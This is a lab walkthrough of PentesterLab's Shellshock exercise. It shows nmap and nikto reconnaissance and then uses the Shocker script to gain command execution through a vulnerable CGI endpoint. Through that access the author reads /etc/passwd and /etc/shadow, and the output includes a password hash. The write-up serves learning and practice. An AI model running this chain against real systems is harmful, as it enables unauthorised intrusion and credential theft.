#Shell Shock from Pentester Lab

This Machine is to test Shellshock Vulnerability using **Shocker Script**

Flag : Read Shadow File

Lets Scan 

```shell
─[micr0b0t@parrot]─[~/Desktop/SalusLab/vpn]
└──╼ $nmap 10.10.10.6

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-16 12:53 EST
Nmap scan report for 10.10.10.6
Host is up (0.011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```
Lets do 1 more Scan to have better vision of what is running on this machine 

```shell┌─[✗]─[micr0b0t@parrot]─[~/Desktop/SalusLab/vpn]
└──╼ $sudo !!
sudo nmap -A -O -sV -p22,80 10.10.10.6
[sudo] password for micr0b0t: 

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-16 12:53 EST
Nmap scan report for 10.10.10.6
Host is up (0.0019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0 (protocol 2.0)
| ssh-hostkey: 
|   1024 8b:4c:a0:14:1c:3c:8c:29:3a:16:1c:f8:1a:70:2a:f3 (DSA)
|   2048 d9:91:5d:c3:ed:78:b5:8c:9a:22:34:69:d5:68:6d:4e (RSA)
|_  256 b2:23:9a:fa:a7:7a:cb:cd:30:85:f9:cb:b8:17:ae:05 (ECDSA)
80/tcp open  http    Apache httpd 2.2.21 ((Unix) DAV/2)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.21 (Unix) DAV/2
|_http-title: [PentesterLab] CVE-2014-6271
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.8 (95%), DD-WRT v3.0 (Linux 4.4.2) (95%), Linux 3.16 (95%), Linux 3.18 (95%), DD-WRT (Linux 3.18) (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Android 4.1.1 (94%), Android 4.1.2 (94%), Android 4.2.2 (Linux 3.4) (94%), Linux 3.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   3.37 ms 10.8.0.1
2   1.65 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
```
Okay so it has HTTP and SSH 

Lets Scan the HTTP 

```shell
└──╼ $nikto -host 10.10.10.6
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.6
+ Target Hostname:    10.10.10.6
+ Target Port:        80
+ Start Time:         2017-11-16 12:54:15 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (Unix) DAV/2
+ Server leaks inodes via ETags, header found with file /, inode: 7758, size: 1704, mtime: Thu Sep 25 05:56:50 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ Uncommon header 'nikto-added-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/status: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ 8310 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2017-11-16 12:55:10 (GMT-5) (55 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
We have Found ourself a way in **shellshock**

now there are multiple of ways to do it 
Either use Metasploit Shellshock or Exploit db Shellshock or there is a Script Called Shocker on Github can be found on this link https://github.com/nccgroup/shocker

I like to use Shocker Script by **nccgroup**

so lets give it a try 
```shell
┌─[micr0b0t@parrot]─[~/Desktop/SalusLab/exploits/shocker]
└──╼ $python shocker.py -H 10.10.10.6

   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v1.0 
   
 Tom Watson, tom.watson@nccgroup.trust
 https://www.github.com/nccgroup/shocker
     
 Released under the GNU Affero General Public License
 (https://www.gnu.org/licenses/agpl-3.0.html)
    
    
[+] 402 potential targets imported from ./shocker-cgi_list
[+] Checking connectivity with target...
[+] Target was reachable
[+] Looking for vulnerabilities on 10.10.10.6:80
[>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>] (402/402)

[+] 2 potential targets found, attempting exploits
[+] The following URLs appear to be exploitable:
  [1] http://10.10.10.6:80/cgi-bin/status
[+] Would you like to exploit further?
[>] Enter an URL number or 0 to exit: 1
[+] Entering interactive mode for http://10.10.10.6:80/cgi-bin/status
[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'
  > /bin/cat /etc/passwd
  < root:x:0:0:root:/root:/bin/sh
  < lp:x:7:7:lp:/var/spool/lpd:/bin/sh
  < nobody:x:65534:65534:nobody:/nonexistent:/bin/false
  < tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh
  < pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh
  > /bin/cat /etc/shadow
  < root:*:13525:0:99999:7:::
  < lp:*:13510:0:99999:7:::
  < nobody:*:13509:0:99999:7:::
  < tc::13646:0:99999:7:::
  < pentesterlab:$1$X2ZTlPU8$kik70LYKJstA05jp2aLnY/:17486:0:99999:7:::
```
and we have what we need the shadow and passwd 


